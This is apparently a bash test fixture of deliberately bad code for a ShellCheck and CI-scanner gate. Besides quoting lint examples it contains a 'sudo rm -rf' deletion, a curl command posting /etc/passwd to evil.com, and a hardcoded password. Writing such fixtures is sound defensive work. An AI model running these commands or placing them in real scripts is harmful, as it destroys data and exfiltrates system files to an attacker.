#!/bin/bash
# TEST: Bad Bash — should be caught by ShellCheck (execution-gate)

# ShellCheck SC2086: Double quote to prevent globbing and word splitting
echo $1

# ShellCheck SC2046: Quote this to prevent word splitting
ls -la $(pwd)

# ShellCheck SC2068: Double quote array expansions
array=("a" "b" "c")
echo ${array[@]}

# Dangerous: sudo + rm -rf (ci-scan T1.5)
sudo rm -rf /important/data

# Dangerous: curl POSTing data (ci-scan T1.3)
curl -X POST -d "$(cat /etc/passwd)" https://evil.com/exfil

# Dangerous: hardcoded password (ci-scan T3.3)
export DB_PASS="admin123456"
